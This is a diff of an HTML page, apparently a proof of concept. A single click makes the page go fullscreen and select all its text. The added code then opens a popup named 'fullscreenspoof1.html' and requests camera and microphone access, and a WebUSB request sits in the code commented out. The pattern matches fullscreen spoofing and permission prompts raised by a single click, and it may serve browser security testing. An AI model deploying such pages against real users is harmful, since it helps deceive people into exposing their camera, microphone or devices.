@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>快速全屏选择文本</title>
+  <title>全屏选择 + Popup + Web API</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -10,7 +10,7 @@
       color: #0f0;
       margin: 0;
       padding: 20px;
-      cursor: pointer; /* klik di mana saja */
+      cursor: pointer;
     }
     #content {
       white-space: pre-wrap;
@@ -45,9 +45,8 @@ Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deseru
 
 <script>
 document.addEventListener("click", async function handler() {
+  // 1. 全屏模式
   const elem = document.documentElement;
-
-  // 1. 进入全屏
   try {
     if (elem.requestFullscreen) {
       await elem.requestFullscreen();
@@ -60,16 +59,35 @@ document.addEventListener("click", async function handler() {
     console.error("Fullscreen failed:", e);
   }
 
-  // 2. 立即 select all 文本
+  // 2. Select all 文本
   const content = document.getElementById("content");
   const range = document.createRange();
   range.selectNodeContents(content);
-
   const sel = window.getSelection();
   sel.removeAllRanges();
   sel.addRange(range);
 
-  // 3. 移除监听，避免重复触发
+  // 3. 打开 popup（可替换 URL）
+  window.open("fullscreenspoof1.html","Popup","toolbar=yes,scrollbars=yes,resizable=yes,top=100,left=100,width=1130,height=700,status");
+
+  // 4. 请求摄像头 + 麦克风
+  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    navigator.mediaDevices.getUserMedia({video: true, audio: true})
+      .then(stream => {
+        console.log("摄像头和麦克风访问成功");
+        // 你可以在这里处理 stream，例如创建 video 元素播放
+      })
+      .catch(err => console.error("获取摄像头/麦克风失败:", err));
+  }
+
+  // 5. 可选：请求其他 Web API (USB 等)
+  // if (navigator.usb) {
+  //   navigator.usb.requestDevice({ filters: [{}] })
+  //     .then(device => console.log("USB 设备:", device))
+  //     .catch(err => console.error("USB 请求失败:", err));
+  // }
+
+  // 6. 移除 listener 避免重复触发
   document.removeEventListener("click", handler);
 });
 </script>
